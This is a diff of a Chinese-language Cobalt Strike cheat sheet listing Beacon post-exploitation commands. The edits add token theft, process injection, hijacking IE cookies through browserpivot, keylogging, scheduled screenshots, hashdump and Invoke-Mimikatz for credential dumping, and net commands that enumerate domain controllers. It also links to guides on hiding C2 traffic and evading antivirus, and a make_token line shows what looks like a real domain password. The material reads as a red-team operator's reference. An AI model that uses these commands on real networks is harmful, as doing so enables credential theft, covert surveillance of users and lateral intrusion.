@@ -1,7 +1,9 @@
 https://mp.weixin.qq.com/s/F1H4ReV71gK7JeoYxV3n5g
 https://github.com/k8gege/Aggressor/releases/tag/cs
+[Cobalt Strike 最实用的 24 条命令（建议收藏）](https://mp.weixin.qq.com/s/8EbrH9LRei_22Z14UDZUmQ)
 
 ## 环境配置
+
 插件加载信息保存在 `%userprofile%\.aggressor.prop`
 
 ## 工具栏
@@ -21,6 +23,8 @@ net 在目标上执行net命令
 desktop pid [x86|x64] low|high # VNC: vnc dll注入到指定进程中运行 注：需要确保cs服务端有vnc dll
 ssh [host:port] [user][pass]
 drives: List current system drives.
+getprivs
+inject [pid] <x86|x64> [listener]
 exit # 结束Beacon进程
 ## 横向移动
 beacon> rportfwd [listen_port][forward_host][forward_port]
@@ -34,7 +38,7 @@ beacon> make_token WANFANG2008\xxzx XKsi_920902Su@
 beacon> ls \\192.168.61.129\C$
 beacon> jump psexec IISSERVER smb
 ### 启动 http 代理
-beacon> browserpivot <pid> # pid必须为iexplore.exe 下的pid
+beacon> browserpivot <pid> # pid必须为iexplore.exe 下的pid # Browser Pivot模块用于劫持目标的IE浏览器，在目标主机上开设代理。本地浏览器通过代理劫持目标的Cookie实现免登录（在访问目标的IE浏览器所访问的网址时，使用的就是目标IE浏览器的Cookie）。
 ### other
 reg 注册表查询命令(仅能查询)
 reg query [x86|x64] [root\path]
@@ -79,6 +83,34 @@ process_browser           # 打开进程浏览器。
 ```
 
 [转发上线](####转发上线)
+
+### shell/run/execute/powershell/powerpick 区别
+
+| cmd                                  | example                                                                 | Desc                                     |
+| ------------------------------------ | ----------------------------------------------------------------------- | ---------------------------------------- |
+| run ipconfig                         | 等于 run cmd ipconfig                                                   | 从 cmd 启动程序                          |
+| shell ipconfig                       | 等于 shell ipconfig                                                     | 直接启动程序                             |
+| execute [program] [arguments]        |                                                                         | 后台运行且没有回显                       |
+| powerpick [commandlet] [arguments]   |                                                                         | 可以不通过调用 powershell.exe 来执行命令 |
+| powershell [commandlet] [arguments]  |
+| powershell-import [/path/script.ps1] | powershell-import /root/Desktop/powerview.ps1<br> powershell Get-HostIP |
+
+### Net View
+
+```sh
+Beacon命令行：net view <DOMAIN>。
+net view命令，会显示指定计算机共享的域、计算机和资源的列表。在Cobalt Strike主界面中选择一个Beacon，进入交互模式，输入“net view”命令，如图所示。
+net computers：通过查询域控制器上的计算机账户列表来查找目标。
+net dclist：列出域控制器。
+net domain_trusts：列出域信任列表。
+net group：枚举自身所在域控制器中的组。“net group \\target”命令用于指定域控制器。“net group \\target <GROUPNAME>”命令用于指定组名，以获取域控制器中指定组的用户列表。
+net localgroup：枚举当前系统中的本地组。“net localgroup \\target”命令用于指定要枚举的远程系统中的本地组。“net localgroup \\target <GROUPNAME>”命令用于指定组名，以获取目标机器中本地组的用户列表。
+net logons：列出登录的用户。
+net sessions：列出会话。
+net share：列出共享的目录和文件。
+net user：列出用户。
+net time：显示时间。
+```
 
 ## 环境介绍
 
@@ -219,6 +251,7 @@ HTTP Proxy: http://192.168.111.131:822
 ```
 
 #### 转发上线
+
 [Link](#上线转发代理)
 
 ```sh
@@ -399,12 +432,13 @@ User Exploitation
 - `jobs`
 - `jobkill ID`
 - Deploy Screenshot Tool
-  - `screenshot [pid] [x86|x64] [time]`
+  - `screenshot [pid] [x86|x64] [run time in seconds]`
+  - `screenshot 2032 10` # 每 10 秒截图一次
 - Deploy Keystroke Logger
   - `keylogger` 或 `keylogger [pid] [x86|x64]`
 - Results at:
   - `View -Screenshots` and `View -Keystrokes` 右击 X 可以浮动窗口或分屏
-- Watch or control target's desktop
+- Watch or control target's desktop / VNC
   - sleep 0
   - desktop [pid] [arch] [low|high]
 - Use `desktop` by itself to spawn a temporary process and inject into it.
@@ -431,11 +465,11 @@ User Exploitation
   - hashdump 3524 x64 # `hashdump <pid> [x86|x64]`
 - `View -> Credentials` to manage
 
-### Port Scanning
+### Port Scanning/端口扫描模块
 
 右击 Session - `Explore - Port Scan` 或
 
-portscan <hosts> [ports] [arp|icmp|none] [max]`
+`portscan <hosts> [ports] [arp|icmp|none] [max connections]`
 
 - Beacon has a port scanner for target discovery
 - Arguments:
@@ -589,6 +623,7 @@ beacon > powerpick Invoke-Command -ComputerName FILESERVER -ScriptBlock {dir c:\
 beacon > powerpick Invoke-Command -ComputerName FILESERVER -ScriptBlock { systeminfo }
 beacon > powershell-import /root/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
 beacon > powerpick Invoke-Mimikatz -ComputerName FILESERVER
+beacon > steal_token [pid]  # 偷域管身份
 ```
 
 **Steal Token**
@@ -716,6 +751,7 @@ on ssh_initial {
     bsleep($1, 60);
 }
 ```
+
 ### arsenal-kit
 
 ```sh
@@ -725,6 +761,7 @@ sleepmask_syscalls_method="indirect_randomized"
 
 resource.rc 可以自定义
 ```
+
 # Learning
 
 ## Step1
@@ -882,13 +919,12 @@ sub dialog_test {
 [基于 Caddy 实现的 C2 前置代理 - RedCaddy](https://mp.weixin.qq.com/s/usHrpgxCvGsu9vvf0SMSBQ)
 [C2 隐藏 \_ 让你的流量更隐蔽（一）](https://mp.weixin.qq.com/s/_TGeK41W56IfN8clmvsRtQ)
 [C2 隐藏 \_ 让你的流量更隐蔽（二）](https://mp.weixin.qq.com/s/6WJUTKPgg9OgtKVkUbPucg)
-[浅谈cobalt strike特征隐藏](https://mp.weixin.qq.com/s/zImEai6xDz1HNR6vHxL9gA)
-[干货分享 | 魔改cs4.5--消除流量特征](https://mp.weixin.qq.com/s/g6sWwKkCMESAibj3CU87lQ)
-[内网神器Cobalt Strike隐藏特征与流量混淆.](https://mp.weixin.qq.com/s/TUldKUINcofoGZtRApMc0Q)
+[浅谈 cobalt strike 特征隐藏](https://mp.weixin.qq.com/s/zImEai6xDz1HNR6vHxL9gA)
+[干货分享 | 魔改 cs4.5--消除流量特征](https://mp.weixin.qq.com/s/g6sWwKkCMESAibj3CU87lQ)
+[内网神器 Cobalt Strike 隐藏特征与流量混淆.](https://mp.weixin.qq.com/s/TUldKUINcofoGZtRApMc0Q)
 
 [4.9 | 【第一部分】CobaltStrike v4.9 新功能尝鲜](https://www.bilibili.com/video/BV1pp4y1F7mt/)
-[CobaltStrike逆向学习系列(番外篇)-自定义RDI功能添加](https://mp.weixin.qq.com/s/k3n6gEU26EO7cvwT1mGoxA)
-
+[CobaltStrike 逆向学习系列(番外篇)-自定义 RDI 功能添加](https://mp.weixin.qq.com/s/k3n6gEU26EO7cvwT1mGoxA)
 
 ## 使用帮助
 
@@ -902,12 +938,12 @@ sub dialog_test {
 
 ## plugin
 
-[cs直接生成就360免杀?? 最新Artifact套件使用教程](https://www.bilibili.com/video/BV1yu4y1Y7Dp/) 
+[cs 直接生成就 360 免杀?? 最新 Artifact 套件使用教程](https://www.bilibili.com/video/BV1yu4y1Y7Dp/)
 [分享个 CobaltStrike 插件 Bypass 防护添加用户（附下载）](https://mp.weixin.qq.com/s/6nu1dwdvdtnP_6C-nIpMVg)
 [Cobalt-Strike 之 CrossC2 插件安装与 linux 上线](https://mp.weixin.qq.com/s/Fty2S9ettdtTFgJWVTvQNQ)
 [CobaltStrike 加载插件](https://mp.weixin.qq.com/s/NtxhTkuMGhhRyLUREnZQcA)
 [免杀 | Arsenal-kit | 聊聊红队攻防中 CobalStrike 的多维度对抗](https://mp.weixin.qq.com/s/fF6frplnurl-rCivYs0fFA)
-[红队工具推荐：Cobalt Strike的远程桌面](https://mp.weixin.qq.com/s/_cVF-JyTkdeJZznEXZ9uqQ)
+[红队工具推荐：Cobalt Strike 的远程桌面](https://mp.weixin.qq.com/s/_cVF-JyTkdeJZznEXZ9uqQ)
 
 ## Vocabulary
 
